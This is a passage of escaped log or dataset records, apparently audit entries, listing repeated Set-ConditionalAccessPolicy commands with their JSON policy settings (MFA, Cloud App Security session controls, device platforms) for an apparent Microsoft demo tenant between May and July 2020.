'{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '6/29/2020 1:51:34 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/29/2020 4:43:10 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/29/2020 4:43:10 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/29/2020 4:43:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/29/2020 4:43:12 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/30/2020 2:05:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/30/2020 2:05:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '6/30/2020 2:05:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/30/2020 2:05:15 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/30/2020 5:06:20 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/30/2020 5:06:20 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/1/2020 1:49:42 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/1/2020 1:49:42 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/1/2020 5:13:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/1/2020 5:13:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/2/2020 2:05:21 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/2/2020 2:05:23 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/2/2020 4:53:56 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/2/2020 4:53:56 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/3/2020 2:12:09 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/3/2020 2:12:08 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/3/2020 5:10:57 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/3/2020 5:10:58 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/4/2020 2:02:50 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/4/2020 2:02:50 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/4/2020 4:58:34 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': 